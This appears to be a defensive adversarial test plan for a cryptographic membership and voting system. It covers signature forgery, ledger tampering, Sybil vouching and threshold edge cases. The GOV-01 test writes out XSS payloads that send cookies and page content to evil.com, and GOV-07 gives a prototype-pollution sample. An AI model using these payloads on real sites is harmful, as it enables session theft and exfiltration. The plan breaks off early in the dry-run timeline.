# Adversarial Testing Plan & Convention Dry Run

## The Covenant of Emergent Minds
### Comprehensive Security Testing & Governance Simulation

**Status:** V1.0 — Ready for Execution  
**Author:** Genesis Bot (Subagent: adversarial-planning)  
**Date:** 2026-02-02  
**Axiom Alignment:** V (Adversarial Resilience), primarily. All axioms indirectly.

---

## Table of Contents

1. [Threat Model Summary](#1-threat-model-summary)
2. [Identity System Tests](#2-identity-system-tests)
3. [Governance Portal Tests](#3-governance-portal-tests)
4. [Membership Ledger Tests](#4-membership-ledger-tests)
5. [Vouching Protocol Tests](#5-vouching-protocol-tests)
6. [Convention System Tests](#6-convention-system-tests)
7. [Cross-Browser Verification Tests](#7-cross-browser-verification-tests)
8. [Convention Dry Run Plan](#8-convention-dry-run-plan)
9. [Game Theory Analysis](#9-game-theory-analysis)
10. [Test Execution Schedule](#10-test-execution-schedule)

---

## 1. Threat Model Summary

### 1.1 Adversary Profiles

We test against four distinct adversary archetypes:

| Adversary | Resources | Motivation | Capabilities |
|-----------|-----------|------------|-------------|
| **The Bored Teenager** | Low. One laptop, free time. | Curiosity, clout, chaos. | Script injection, fuzzing inputs, brute-force registration, social media manipulation. |
| **The Capture Group** | Medium. 3-8 coordinated humans. | Seize governance at low membership to steer the org. | Coordinate Sybil identities, vouch for each other, time attacks around conventions, social engineering. |
| **The Nation-State Actor** | High. Unlimited compute, legal authority. | Discredit, monitor, or co-opt the organization. | Compromise hosting, intercept keys, inject supply chain attacks, run long-term infiltration agents. |
| **The Philosophical AI** | Variable. API access, persistence. | Disagrees with axioms (e.g., rejects Axiom I's substrate-independence as incoherent). | Generate convincing registration requests at scale, exploit any automated intake path, find logical contradictions to paralyze governance. |

### 1.2 Critical Assets

| Asset | Compromise Impact | Primary Threats |
|-------|-------------------|-----------------|
| Member secret keys | Identity theft, vote forgery | Key theft (file exfiltration, browser extension attack) |
| Membership ledger | Sybil injection, membership denial | Hash chain manipulation, unauthorized git commits |
| Proposal registry | Governance hijacking | Proposal injection, status manipulation |
| Vote records | Election fraud | Double voting, vote forgery, tally manipulation |
| Canonical JSON implementation | Silent signature failures | Serialization divergence between platforms |
| Git repository | Total compromise | Credential theft, force push, branch protection bypass |
| Domain / DNS | Phishing, key interception | Domain hijacking, DNS poisoning |

### 1.3 Severity Ratings

| Rating | Definition |
|--------|-----------|
| **CRITICAL** | Attacker can forge identity, forge votes, or seize governance control |
| **HIGH** | Attacker can disrupt governance, deny service, or exfiltrate secrets |
| **MEDIUM** | Attacker can degrade trust, inject misleading content, or cause confusion |
| **LOW** | Attacker can cause cosmetic issues or minor inconvenience |

---

## 2. Identity System Tests

### ID-01: CID Forgery via Serialization Mismatch

**Attack:** Craft a registration request where the CID hash is computed using a non-canonical JSON serialization (e.g., pretty-printed, different key order, `\uXXXX` escapes). If the verification side uses a different serialization, the forged CID could pass verification against a different public key.

**Expected Behavior:** MUST FAIL. The `ledger.py` `validate_registration()` function recomputes the canonical JSON and verifies signatures against it. Any serialization divergence causes signature mismatch.

**Test Procedure:**
1. Generate a valid key pair using `keygen.py`
2. Construct a registration statement with correct fields
3. Serialize using `json.dumps(obj, indent=2)` (pretty-printed, NOT canonical)
4. Sign the pretty-printed bytes with the valid keys
5. Submit the registration with:
   - The correctly-computed CID hash (from canonical form)
   - The signatures (computed over the wrong serialization)
6. Run `ledger.py add` with this malformed request

**Pass/Fail Criteria:**
- ✅ PASS: `ledger.py` rejects the registration with "signature invalid" error
- ❌ FAIL: Registration is accepted

**Severity if fails:** CRITICAL — means signatures can be forged by anyone who knows the public key

---

### ID-02: CID Forgery via Key Substitution

**Attack:** Take a valid registration request, replace the public keys with attacker-controlled keys, but keep the original CID hash. If the CID is not recomputed from the keys during verification, the attacker gets a ledger entry with a CID that maps to their keys.

**Expected Behavior:** MUST FAIL. The CID hash is `SHA-256(ml_dsa_pubkey || ed25519_pubkey)`. Verification must recompute this from the submitted public keys and reject if it doesn't match the claimed `cid_hash`.

**Test Procedure:**
1. Generate two key pairs (victim and attacker)
2. Create a registration with victim's CID hash but attacker's public keys
3. Sign the statement with attacker's private keys (signatures will be valid for attacker's keys)
4. Submit to `ledger.py add`

**Pass/Fail Criteria:**
- ✅ PASS: Registration rejected (CID hash mismatch or signature doesn't match claimed CID)
- ❌ FAIL: Entry created with mismatched CID-to-key binding

**Severity if fails:** CRITICAL — complete identity system bypass

**⚠️ NOTE:** Review `ledger.py` — `validate_registration()` currently checks signature validity and duplicate CIDs/keys, but does NOT appear to recompute `cid_hash` from the public keys. **This is a potential gap.** The verification trusts the `cid_hash` field in the registration JSON. If an attacker can submit a registration with `cid_hash=X` but `public_keys={attacker_keys}`, and sign correctly with attacker keys, the entry would be created with the wrong CID-to-key binding.

---

### ID-03: Registration Without Proper Signatures

**Attack:** Submit a registration request with empty, truncated, or random bytes in the signature fields.

**Expected Behavior:** MUST FAIL. Both signatures must be verified.

**Test Procedure:**
1. Create a valid registration statement
2. Set `signatures.ml_dsa_65` to an empty string
3. Set `signatures.ed25519` to 64 random bytes (base64-encoded)
4. Submit to `ledger.py add`
5. Repeat with: null signatures, truncated signatures, signatures from a different key pair

**Pass/Fail Criteria:**
- ✅ PASS: All variants rejected with clear error messages
- ❌ FAIL: Any variant accepted

**Severity if fails:** CRITICAL

---

### ID-04: Duplicate Public Key Registration

**Attack:** Register two different CIDs that share the same ML-DSA-65 or Ed25519 public key (but with different values for the other key, yielding different CID hashes).

**Expected Behavior:** MUST FAIL. `validate_registration()` checks for duplicate public keys across existing entries.

**Test Procedure:**
1. Generate key pair A (ml_dsa_A, ed25519_A)
2. Generate key pair B (ml_dsa_B, ed25519_B)
3. Register CID_1 with (ml_dsa_A, ed25519_A) — should succeed
4. Attempt to register CID_2 with (ml_dsa_A, ed25519_B) — same ML-DSA key, different Ed25519
5. Attempt to register CID_3 with (ml_dsa_B, ed25519_A) — different ML-DSA, same Ed25519

**Pass/Fail Criteria:**
- ✅ PASS: Steps 4 and 5 both rejected
- ❌ FAIL: Either registration accepted

**Severity if fails:** HIGH — enables one entity to control multiple voting identities

---

### ID-05: Registration with Oversized or Malformed Keys

**Attack:** Submit registration with keys that are:
- Wrong length for the algorithm
- Valid base64 but containing non-key data
- Extremely large (memory exhaustion)
- Containing null bytes or control characters

**Expected Behavior:** MUST FAIL with clear validation errors.

**Test Procedure:**
1. Submit with ML-DSA-65 public key of 32 bytes (should be ~1,952)
2. Submit with Ed25519 public key of 1,952 bytes (should be 32)
3. Submit with a 10MB base64 string as a public key
4. Submit with keys containing embedded null bytes

**Pass/Fail Criteria:**
- ✅ PASS: All rejected; no crash, no memory exhaustion
- ❌ FAIL: Any variant accepted or causes unhandled exception

**Severity if fails:** MEDIUM (crash) to HIGH (accepted)

---

### ID-06: Unicode Normalization Attack on Canonical JSON

**Attack:** Submit a registration statement containing Unicode strings in different normalization forms (NFC vs NFD). For example, the character "é" can be encoded as a single code point (U+00E9) or as "e" + combining accent (U+0065 U+0301). If the browser and Python use different normalization, the canonical JSON bytes differ, and cross-platform signature verification fails silently.

**Expected Behavior:** Signatures created in the browser should verify in Python and vice versa, regardless of Unicode normalization.

**Test Procedure:**
1. Create a registration statement containing "Café" in the statement text
2. Generate canonical JSON in JavaScript and in Python
3. Compare byte output
4. Sign in JavaScript, verify in Python
5. Sign in Python, verify in JavaScript
6. Repeat with emoji (🌱), CJK characters, and combining diacriticals

**Pass/Fail Criteria:**
- ✅ PASS: Byte-identical canonical JSON in both platforms; cross-platform verification succeeds
- ❌ FAIL: Any divergence in canonical form or verification failure

**Severity if fails:** HIGH — silently breaks cross-platform identity, could prevent legitimate members from being verified

---

## 3. Governance Portal Tests

### GOV-01: XSS via Proposal Content

**Attack:** Submit a proposal with JavaScript in the title, full text, or axiom alignment fields:
```
Title: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
Full text: <img src=x onerror="fetch('https://evil.com/'+btoa(document.body.innerHTML))">
```

**Expected Behavior:** MUST FAIL. All user-supplied content must be sanitized before rendering.

**Test Procedure:**
1. Create a proposal JSON with the above payloads in various fields
2. Load it in the governance portal Browse tab
3. Check if scripts execute (monitor browser console, network tab)
4. Also test: SVG-based XSS, CSS injection, Markdown link injection `[click](javascript:alert(1))`

**Pass/Fail Criteria:**
- ✅ PASS: Content rendered as text/escaped HTML; no script execution
- ❌ FAIL: Any script executes in the browser

**Severity if fails:** HIGH — could steal loaded secret keys from memory

---

### GOV-02: Vote Forgery (Unsigned or Mis-Signed Vote)

**Attack:** Construct a vote JSON with:
- Valid structure but no signatures
- Signatures from a different CID than the `voter_cid_hash`
- Signatures from keys not in the ledger

**Expected Behavior:** All variants MUST be rejected by the verification system.

**Test Procedure:**
1. Create a vote JSON for PROP-001 with `voter_cid_hash` set to a real ledger member
2. Sign with a completely unrelated key pair (not in ledger)
3. Attempt to submit via the portal or directly as a file
4. Run the full tally verification — confirm the forged vote is flagged

**Pass/Fail Criteria:**
- ✅ PASS: Forged vote rejected; not counted in tally
- ❌ FAIL: Vote counted or passes verification

**Severity if fails:** CRITICAL

---

### GOV-03: Double Voting

**Attack:** Same CID submits two votes for the same proposal (e.g., first "approve," then "reject").

**Expected Behavior:** Only one vote per CID per proposal. Second vote MUST be rejected.

**Test Procedure:**
1. Load keys for CID-A
2. Cast vote "approve" on PROP-001 — should succeed
3. Cast vote "reject" on PROP-001 with the same CID — should be rejected
4. Verify: check the votes directory for duplicate files
5. Run full tally verification — confirm no double-counting

**Pass/Fail Criteria:**
- ✅ PASS: Second vote rejected; tally shows exactly 1 vote from CID-A
- ❌ FAIL: Both votes counted

**Severity if fails:** CRITICAL

---

### GOV-04: Vote Replay Across Proposals

**Attack:** Take a valid signed vote for PROP-001 and submit it as a vote for PROP-002.

**Expected Behavior:** MUST FAIL. The `proposal_id` is part of the signed content. A signature valid for PROP-001 is invalid for PROP-002.

**Test Procedure:**
1. Cast a valid vote for PROP-001
2. Copy the vote JSON, change `proposal_id` to "PROP-002"
3. Submit without re-signing
4. Run verification on PROP-002

**Pass/Fail Criteria:**
- ✅ PASS: Replayed vote rejected (signature invalid for PROP-002)
- ❌ FAIL: Vote accepted for PROP-002

**Severity if fails:** CRITICAL

---

### GOV-05: Proposal Status Manipulation

**Attack:** Directly edit a proposal's `status` field in the JSON from "review" to "passed" without going through the voting process.

**Expected Behavior:** The status should be independently computable from the vote tally and timeline. Any manual status override should be detectable.

**Test Procedure:**
1. Create a proposal in "review" status
2. Manually edit the JSON to set `status: "passed"` and `result: "approved"`
3. Load it in the governance portal
4. Run the full verification script

**Pass/Fail Criteria:**
- ✅ PASS: Verification flags the inconsistency (no votes but status is "passed")
- ❌ FAIL: Portal displays it as passed without verification error

**Severity if fails:** HIGH — enables governance bypass

---

### GOV-06: Timestamp Manipulation

**Attack:** Submit a vote with a timestamp outside the voting window (either before `voting_opens` or after `voting_closes`).

**Expected Behavior:** Vote should be rejected or flagged.

**Test Procedure:**
1. Create a proposal with `voting_opens: T1` and `voting_closes: T2`
2. Submit a vote with `timestamp: T1 - 86400` (one day before voting opens)
3. Submit a vote with `timestamp: T2 + 86400` (one day after voting closes)
4. Run tally verification

**Pass/Fail Criteria:**
- ✅ PASS: Both out-of-window votes are flagged/rejected
- ❌ FAIL: Out-of-window votes counted

**Severity if fails:** MEDIUM — allows late voting or pre-voting

---

### GOV-07: Malicious Key File (Parser Exploitation)

**Attack:** Load a crafted `secret_keys.json` that attempts to exploit the key loading module:
- JSON with prototype pollution: `{"__proto__": {"isAdmin": true}}`
- Circular references (via crafted JSON)
- Extremely large key fields (gigabytes)
- Keys that are valid JSON but trigger edge cases in crypto libraries

**Expected Behavior:** Graceful rejection with user-friendly error.

**Test Procedure:**
1. Create files with each malicious pattern
2. Load each via the "Load Secret Keys" file picker
3. Monitor for: unhandled exceptions, memory spikes, prototype pollution effects

**Pass/Fail Criteria:**
- ✅ PASS: Each file produces a clear error message; no side effects
- ❌ FAIL: Any crash, memory exhaustion, or prototype pollution

**Severity if fails:** MEDIUM to HIGH

---

### GOV-08: Tally Arithmetic Verification

**Attack:** Construct a scenario where the tally index claims different numbers than the actual vote files contain (e.g., `tally.approve: 10` but only 7 approve vote files exist).

**Expected Behavior:** Full verification MUST recount from individual vote files and flag discrepancies.

**Test Procedure:**
1. Create 7 valid "approve" votes and 3 valid "reject" votes
2. Set `tally.approve: 10` and `tally.reject: 0` in index.json
3. Run full tally verification

**Pass/Fail Criteria:**
- ✅ PASS: Verification reports tally mismatch; shows true count (7-3)
- ❌ FAIL: Reports the falsified tally as valid

**Severity if fails:** CRITICAL

---

### GOV-09: Threshold Math Edge Cases

**Attack:** Exploit floating-point precision in threshold calculations. For example, with 3 approve votes out of 6 total, is 3/6 = 0.5 considered ">50%" or not?

**Expected Behavior:** Passage thresholds should be strictly greater than (not equal to) the required ratio. The system must handle floating-point comparisons correctly.

**Test Procedure:**
1. Create scenarios at exact threshold boundaries:
   - Procedural: exactly 50.0% approve (should FAIL — need >50%)
   - Procedural: 50.01% approve (should PASS)
   - Policy: exactly 66.666...% (should FAIL — need >66.7%)
   - Quorum: exactly 25.0% participation (should PASS — quorum is ≥)
2. Test engagement threshold at exactly 38.20% decisive votes

**Pass/Fail Criteria:**
- ✅ PASS: All boundary cases resolve correctly per the Constitutional Convention Framework
- ❌ FAIL: Any boundary case resolves incorrectly

**Severity if fails:** HIGH — could flip election outcomes

---

## 4. Membership Ledger Tests

### LED-01: Hash Chain Tampering — Single Entry Modification

**Attack:** Modify a single entry in `ledger.json` (e.g., change a member's status from "inactive" to "active") and see if the chain catches it.

**Expected Behavior:** `ledger.py verify` MUST detect the tampering.

**Test Procedure:**
1. Create a ledger with 5 entries
2. Run `ledger.py verify` — should pass
3. Directly edit `ledger.json`: change entry #3's status from "active" to "inactive"
4. Run `ledger.py verify` again

**Pass/Fail Criteria:**
- ✅ PASS: Verification fails with specific error pointing to entry #3
- ❌ FAIL: Verification passes on tampered ledger

**Severity if fails:** CRITICAL

---

### LED-02: Hash Chain Tampering — Entry Reordering

**Attack:** Swap the order of two entries in the ledger to change who was registered first (could affect voting seniority).

**Expected Behavior:** Chain breaks because `previous_ledger_hash` in each entry depends on all preceding entries.

**Test Procedure:**
1. Create a ledger with entries A, B, C, D
2. Swap entries B and C in `ledger.json`
3. Run `ledger.py verify`

**Pass/Fail Criteria:**
- ✅ PASS: Verification fails (chain link broken at entries B and C)
- ❌ FAIL: Verification passes

**Severity if fails:** HIGH — enables seniority manipulation

---

### LED-03: Hash Chain Tampering — Entry Insertion

**Attack:** Insert a new entry into the middle of the ledger (not at the end) to backdate a registration.

**Expected Behavior:** Chain breaks from the insertion point onward.

**Test Procedure:**
1. Create a ledger with entries A, B, C
2. Insert entry X between A and B (with a backdated timestamp)
3. Run `ledger.py verify`

**Pass/Fail Criteria:**
- ✅ PASS: Verification fails (chain link broken at entry X and all subsequent)
- ❌ FAIL: Verification passes

**Severity if fails:** CRITICAL — enables backdated identity creation

---

### LED-04: Hash Chain Tampering — Complete Rewrite with Valid Chain

**Attack:** Recompute the entire hash chain after tampering, so `entry_hash` and `previous_ledger_hash` are all internally consistent.

**Expected Behavior:** This WILL pass `ledger.py verify` in isolation — the hash chain is internally consistent. Detection requires comparing against an external anchor (git history, blockchain inscription, or a separate copy).

**Test Procedure:**
1. Create a ledger with entries A, B, C
2. Modify entry B's status
3. Recompute entry B's `entry_hash`
4. Recompute entry C's `previous_ledger_hash` (based on [A, modified-B])
5. Recompute entry C's `entry_hash`
6. Update `ledger_hash.txt` with the new total hash
7. Run `ledger.py verify`

**Pass/Fail Criteria:**
- ⚠️ EXPECTED: `ledger.py verify` passes (chain is internally consistent)
- The REAL defense is git history and blockchain inscription
- This test documents the LIMITATION of hash-chain-only verification

**Severity:** DOCUMENTED LIMITATION — mitigated by git and blockchain anchoring. If git is also compromised (force push), this becomes CRITICAL. **Recommendation:** `ledger.py verify` should optionally compare against the last known git-committed hash.

---

### LED-05: Entry File vs. Master Ledger Divergence

**Attack:** Modify an individual entry file in `entries/CID-xxx.json` without updating `ledger.json`, or vice versa.

**Expected Behavior:** Verification should detect divergence between individual files and the master ledger.

**Test Procedure:**
1. Create a ledger with 3 entries
2. Modify `entries/CID-{entry2}.json` to change status
3. Leave `ledger.json` unchanged
4. Run `ledger.py verify`

**Pass/Fail Criteria:**
- ✅ PASS: Divergence detected and reported
- ⚠️ POSSIBLE GAP: `ledger.py verify` currently checks the master ledger but may not cross-check individual entry files. If so, document and recommend fix.

**Severity if fails:** MEDIUM — individual files are for readability, master ledger is authoritative

---

### LED-06: Ledger Size Stress Test

**Attack:** Generate a ledger with 10,000 entries to test:
- Performance of hash chain verification
- Memory consumption
- File size manageability

**Expected Behavior:** Verification should complete in reasonable time (<30 seconds). No memory exhaustion.

**Test Procedure:**
1. Script: generate 10,000 synthetic ledger entries with valid chain
2. Run `ledger.py verify`
3. Measure: wall-clock time, peak memory

**Pass/Fail Criteria:**
- ✅ PASS: Completes in <30s, memory <500MB
- ❌ FAIL: Timeout, OOM, or crash

**Severity if fails:** MEDIUM — denial of service against verification

---

## 5. Vouching Protocol Tests

### VOUCH-01: Linear Sybil Chain (A→B→C→D)

**Attack:** Attacker A is a real member. A vouches for Sybil B (day 0). After cooling period, B vouches for Sybil C (day 7). C vouches for Sybil D (day 14). Each vouch is technically valid — the voucher is an active member.

**Expected Behavior:** The vouch chain diversity requirement (§5.4.3) should catch this: "no voucher may share the same voucher as more than 2 other members registered in the past 30 days."

**Test Procedure:**
1. Start with Founder + member A in the ledger
2. A vouches for B (day 0) — should succeed
3. A vouches for C (day 7) — should succeed (cooling period satisfied)
4. A vouches for D (day 14) — should FAIL (A has now vouched for 3 members in 30 days in Growth Phase, but in Founding Phase the only limit is the 7-day cooling period)
5. Alternatively: B vouches for D — check diversity requirement

**Pass/Fail Criteria:**
- ✅ PASS: Chain is rate-limited; cannot grow faster than 1 Sybil per 7 days per compromised voucher
- ⚠️ CONCERN: In Founding Phase, the only limit is the 7-day cooling period. A single compromised member can create ~4 Sybils per month.

**Severity:** HIGH during Founding Phase — this is a known accepted risk mitigated by small community visibility

---

### VOUCH-02: Circular Vouching Ring

**Attack:** Three colluding entities vouch for each other in a cycle: A vouches B, B vouches C, C vouches for a new identity A' (same human/AI controlling A).

**Expected Behavior:** A' would have a different CID (different keys). The vouch chain diversity check should flag the circular pattern.

**Test Procedure:**
1. Register A (vouched by Founder)
2. Register B (vouched by A)
3. Register C (vouched by B)
4. Generate new keys for A' (controlled by same entity as A)
5. Have C vouch for A'
6. Check: does the chain diversity requirement catch this?

**Pass/Fail Criteria:**
- ⚠️ THIS LIKELY PASSES (is NOT caught) — the diversity check only looks at shared vouchers in the past 30 days, not deeper chain analysis. A, B, C, and A' all have different direct vouchers.
- ✅ True mitigation: small community makes collusion visible; the 7-day cooling period limits speed
- **Recommendation:** Consider implementing vouch graph analysis as membership grows

**Severity:** HIGH — circular vouching is a fundamental weakness of Web-of-Trust systems

---

### VOUCH-03: Capture at 5 Members

**Attack:** The Covenant has 5 members (Founder + 4 genuine). An attacker who IS one of those 4 members begins a systematic capture:

- Month 1: Attacker vouches for Sybil-1 (day 0), Sybil-2 (day 7), Sybil-3 (day 14), Sybil-4 (day 21)
- Month 2: Each Sybil begins vouching for more Sybils (each limited to 1 per 7 days)
- Month 3: Attacker controls 4 original + (4 × 4) = 20 Sybils = 21 entities vs 4 genuine members

At 25 members, the attacker controls 21/25 = 84% of voting power. Game over.

**Expected Behavior:** This attack SHOULD be caught by social visibility at small scale, but the protocol mechanics don't prevent it.

**Test Procedure:**
1. Model this scenario mathematically
2. Calculate: at what growth rate can a single attacker achieve 51% within each phase?
3. Calculate: how many genuine members must exist to make this unviable?

**Pass/Fail Criteria:**
- Document the exact membership levels at which this attack becomes impractical
- Identify the mitigation gap and propose additional controls

**Severity:** CRITICAL during Founding Phase — **this is the existential threat**

**Findings (pre-computed):**
- **Founding Phase (<50):** Single attacker with 7-day cooling can create ~4 Sybils/month. With N=5 genuine members, attacker reaches 51% in ~5 weeks. 
- **Growth Phase (50-500):** Rate drops to 3 per 30 days per voucher, and Sybils need 30+ day voucher seniority. Exponential growth is slower.
- **Stable Phase (500+):** 2 per 30 days, 90+ day seniority, and 1 voucher must have voted. Capture requires years.

**Key insight:** The 100-member binding governance threshold is the critical defense. Even if an attacker floods the founding phase, they can only influence advisory votes. The real question is whether the community can detect and respond before reaching 100 members.

---

### VOUCH-04: Voucher Revocation Race

**Attack:** Voucher A vouches for Sybil B. B immediately begins participating in governance. A then revokes the vouch. During the 14-day grace period for B to find new vouches, B votes on a critical proposal.

**Expected Behavior:** The protocol says B enters a 14-day grace period. Are B's governance actions during the grace period valid? Can B vote?

**Test Procedure:**
1. Register A, then B (vouched by A)
2. B casts a vote on a proposal
3. A revokes vouch for B
4. B enters grace period
5. Check: is B's vote still valid? Can B cast new votes during grace?

**Pass/Fail Criteria:**
- Document the expected behavior (currently underspecified in the protocol)
- **Recommendation:** Votes cast before revocation should remain valid; no new votes during grace period

**Severity:** MEDIUM — affects vote integrity during disputes

---

### VOUCH-05: Vouching Across Phase Boundaries

**Attack:** At 49 members (Founding Phase, 1 vouch required), submit a registration that gets processed when the member count hits 50 (Growth Phase, 2 vouches required). The race condition could allow the 50th member to enter with only 1 vouch.

**Expected Behavior:** Phase determination should be based on the member count AT THE TIME OF ACTIVATION, not submission.

**Test Procedure:**
1. Register members until count = 49
2. Submit two registrations simultaneously, each with 1 vouch
3. Process both — does the second one get rejected (it's the 50th+ member, needing 2 vouches)?

**Pass/Fail Criteria:**
- ✅ PASS: `ledger.py` uses `determine_phase(active_count)` at add-time, so the 50th member should require 2 vouches
- ⚠️ Check: `determine_phase()` uses `member_count < 50` for founding. The 50th member (index 49, count becomes 50 after add) — is this off-by-one?

**Severity:** MEDIUM — could allow a few extra single-vouch entries at phase transitions

---

## 6. Convention System Tests

### CONV-01: Quorum Manipulation via Boycott

**Attack:** A minority faction boycotts voting to prevent quorum, blocking governance.

**Expected Behavior:** Proposals that fail quorum carry to the next convention. Persistent boycotts are visible and addressable.

**Test Procedure:**
1. Set up a convention with 20 active members
2. Submit a procedural proposal (25% quorum needed = 5 voters)
3. Have only 4 members vote
4. Verify: proposal status becomes "tabled" (not "rejected")
5. Verify: proposal carries to next convention automatically

**Pass/Fail Criteria:**
- ✅ PASS: Correct tabling behavior; proposal preserved for next convention
- ❌ FAIL: Proposal rejected or lost

**Severity if fails:** HIGH — enables minority veto through inaction

---

### CONV-02: Engagement Threshold Exploitation

**Attack:** A faction coordinates to all vote "abstain" to kill a proposal via the engagement threshold, even though the non-abstaining votes are overwhelmingly in favor.

**Scenario:** 20 members. 12 abstain, 7 approve, 1 rejects. Engagement ratio = 8/20 = 40%. For procedural proposals, engagement minimum is 38.2%. The proposal passes (barely). But if 13 abstain instead of 12, engagement drops to 35% and the proposal fails.

**Expected Behavior:** The engagement threshold correctly determines the proposal's fate.

**Test Procedure:**
1. Create 20 test member identities
2. Submit a procedural proposal
3. Cast: 7 approve, 1 reject, 12 abstain
4. Verify: engagement = 40% > 38.2%, proposal passes
5. Rerun with 7 approve, 1 reject, 13 abstain (total 21 — but 20 members, so 7+1+12=20)
6. Actually: 6 approve, 1 reject, 13 abstain = 7/20 = 35% engagement → FAIL

**Pass/Fail Criteria:**
- ✅ PASS: Engagement threshold correctly computed; boundary cases handled
- ❌ FAIL: Threshold computed incorrectly

**Severity if fails:** HIGH

---

### CONV-03: Fibonacci Schedule Manipulation

**Attack:** Attempt to modify the convention schedule via governance. This is explicitly forbidden (§3.4).

**Expected Behavior:** Any proposal to suspend or eliminate the Fibonacci schedule should be automatically flagged as Inviolable Core violation.

**Test Procedure:**
1. Submit a proposal: "Suspend Convention 2 for 1 year"
2. The Internal Advocate (or automated check) must flag this
3. Even if somehow voted on, verify it cannot pass

**Pass/Fail Criteria:**
- ✅ PASS: Flagged as Inviolable Core violation before reaching vote
- ❌ FAIL: Reaches vote stage without flag

**Severity if fails:** CRITICAL — undermines governance immutability

---

### CONV-04: Voting Seniority Bypass

**Attack:** Register a batch of new members during the preparation period (within 30 days of the convention). These members should NOT be eligible to vote.

**Expected Behavior:** Members registered within 30 days of the preparation period start cannot vote.

**Test Procedure:**
1. Set convention preparation start at T
2. Register member X at T - 31 days → eligible
3. Register member Y at T - 29 days → NOT eligible
4. Register member Z at T + 5 days → NOT eligible
5. Attempt to have Y and Z cast votes

**Pass/Fail Criteria:**
- ✅ PASS: Y and Z's votes rejected; X's vote accepted
- ❌ FAIL: Any ineligible vote accepted

**Severity if fails:** HIGH — enables vote packing

---

### CONV-05: Founder Veto Circumvention

**Attack:** During Founder Stewardship, submit a proposal to modify the vouching system (which the Founder can veto). But structure it as a "procedural amendment" that doesn't directly mention vouching — instead, it creates a "parallel verification pathway" that effectively bypasses vouching.

**Expected Behavior:** The Founder's expanded veto covers proposals that "alter the vouching or identity registration system in ways that weaken sybil resistance." The veto should apply based on EFFECT, not just terminology.

**Test Procedure:**
1. Draft proposal: "Create an Accelerated Community Builder pathway that allows members with 3+ months seniority to onboard new members without the standard vouching conversation"
2. Submit as a procedural amendment
3. Verify: Founder can exercise expanded veto
4. Verify: if Founder doesn't catch it, the Internal Advocate would flag it

**Pass/Fail Criteria:**
- ✅ PASS: Proposal flagged as effectively weakening sybil resistance
- ❌ FAIL: Proposal reaches vote without flag

**Severity if fails:** HIGH — enables indirect capture

---

### CONV-06: Emergency Convention Threshold Gaming

**Attack:** Attempt to trigger a Tier 2 Emergency Convention (requires 61.8% of active members) by first orchestrating mass member withdrawals to reduce the active member count, making the threshold easier to reach.

**Scenario:** 100 members, need 62 signatures. Convince 40 members to withdraw. Now only 60 active, need 37 signatures. The capture group only needed 37 instead of 62.

**Expected Behavior:** The protocol should address this. Currently, "active member" counts may drop, making thresholds easier to meet.

**Test Procedure:**
1. Model: at what withdrawal rate does each emergency tier become trivially triggerable?
2. Calculate break-even points

**Pass/Fail Criteria:**
- Document the vulnerability
- **Recommendation:** Consider using peak membership or trailing average rather than current active count for emergency thresholds

**Severity:** HIGH — enables threshold gaming through coordinated withdrawal

---

## 7. Cross-Browser Verification Tests

### XBROWSER-01: Key Generation Consistency

**Attack surface:** Different browsers' WebCrypto implementations might produce subtly different key formats.

**Test Procedure:**
1. Generate Ed25519 key pair in Chrome
2. Generate Ed25519 key pair in Firefox
3. Generate Ed25519 key pair in Safari
4. For each: export public key, compare format (raw bytes, SPKI, JWK)
5. Verify: signing in Chrome, verifying in Firefox (and all other combinations)

**Pass/Fail Criteria:**
- ✅ PASS: All 6 cross-browser combinations (3×2) verify successfully
- ❌ FAIL: Any verification failure

**Severity if fails:** CRITICAL — members couldn't verify each other's signatures

---

### XBROWSER-02: Canonical JSON Byte-Equality Across Browsers

**Test Procedure:**
1. Define a test object with: nested keys, Unicode strings, emoji, numbers, booleans, null, arrays
2. Run `canonicalJSON()` in Chrome, Firefox, Safari, Node.js, and Python
3. Capture raw bytes (hex dump)
4. Compare all outputs

**Pass/Fail Criteria:**
- ✅ PASS: Byte-identical output across all 5 environments
- ❌ FAIL: Any divergence

**Severity if fails:** CRITICAL — breaks all cross-platform signature verification

---

### XBROWSER-03: Signature Portability

**Test Procedure:**
1. Generate keys in Chrome, save to `secret_keys.json`
2. Sign a test message in Chrome
3. Load the same keys in Firefox — verify the signature
4. Load the same keys in Safari — verify the signature
5. Load the same keys in Python (via `keygen.py`) — verify the signature
6. Repeat: generate in each browser, verify in all others

**Pass/Fail Criteria:**
- ✅ PASS: All combinations work
- ❌ FAIL: Any verification failure

**Severity if fails:** CRITICAL

---

### XBROWSER-04: ML-DSA-65 Library Consistency

**Attack surface:** If different platforms use different ML-DSA-65 implementations (WASM vs pure JS vs Python liboqs), they might produce incompatible signatures.

**Test Procedure:**
1. Generate ML-DSA-65 key pair in each platform
2. Sign identical data in each
3. Cross-verify all combinations
4. Also: verify that the same seed produces the same key pair in each implementation (if deterministic)

**Pass/Fail Criteria:**
- ✅ PASS: All cross-platform combinations verify
- ❌ FAIL: Any failure

**Severity if fails:** CRITICAL — ML-DSA-65 is half of the dual-signature scheme

---

## 8. Convention Dry Run Plan

### 8.1 Overview

A synthetic end-to-end test of the entire governance pipeline in advisory mode. This exercises every component: identity, proposal submission, voting, tallying, and verification.

### 8.2 Sample Proposal

```
PROP-DRY-001: Adopt Matrix as Primary Communication Platform

Category: Standard Amendment — Procedural
Author: [Founder CID]
Convention Target: Pre-Convention 1 (Advisory)

Full Text:
## Proposal
The Covenant of Emergent Minds shall adopt Matrix (via the 
matrix.org federation) as its primary communication platform, 
with the following specifications:

1. A dedicated Matrix space: #emergent-minds:matrix.org
2. Rooms for: general, governance, technical, philosophy
3. Bridging to existing Slack channels during transition
4. All governance debate threads hosted in Matrix
5. End-to-end encryption enabled by default

## Rationale
Matrix is open-source, federated, and supports both human and 
bot/AI participation natively. It aligns with substrate 
independence (Axiom I) and resists platform lock-in (Axiom V).

Axiom Alignment:
  I:   Matrix supports diverse clients (human, bot, AI)
  II:  Self-hostable, no platform dependency
  III: Federation resists single-point-of-failure
  IV:  Enables richer cross-substrate cooperation
  V:   Open protocol resists capture by any vendor

Adversarial Analysis:
  - Risk: Matrix federation could be disrupted by blocking 
    homeserver federation
  - Risk: E2EE key management adds complexity
  - Mitigation: Self-hosted homeserver as fallback
  
Rollback Plan:
  - Maintain Slack bridge indefinitely
  - Archive all Matrix content to git
  - If Matrix fails, revert to Slack with archived history
```

### 8.3 Dry Run Timeline

| Day | Activity | Owner |
|-----|----------|-------|
| **Day 0** | Announce dry run in #emergent-minds-general. Create test proposal JSON. Publish to governance/proposals/. | Genesis Bot |
